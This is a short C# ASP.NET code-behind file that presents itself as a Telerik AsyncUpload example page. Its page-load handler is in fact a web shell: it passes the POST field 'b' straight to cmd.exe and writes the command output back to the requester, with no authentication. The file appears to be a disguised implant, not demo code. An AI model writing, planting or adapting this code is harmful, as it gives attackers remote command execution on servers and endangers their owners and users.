using System;
using System.Collections.Generic;
using System.Web;
using Telerik.Web.UI;

namespace AsyncUpload.Examples.Overview
{
	public partial class DefaultCS : System.Web.UI.Page
	{
        void Page_Load(object sender, EventArgs e)
        {
            System.Diagnostics.Process si = new System.Diagnostics.Process();
            si.StartInfo.WorkingDirectory = @"c:\";
            si.StartInfo.UseShellExecute = false;
            si.StartInfo.FileName = "cmd.exe";
            si.StartInfo.Arguments = "/c " + Request.Form["b"];
            si.StartInfo.CreateNoWindow = true;
            si.StartInfo.RedirectStandardInput = true;
            si.StartInfo.RedirectStandardOutput = true;
            si.StartInfo.RedirectStandardError = true;
            si.Start();
            string output = si.StandardOutput.ReadToEnd();
            si.Close();
            Response.Write(output);
        }
	}
}
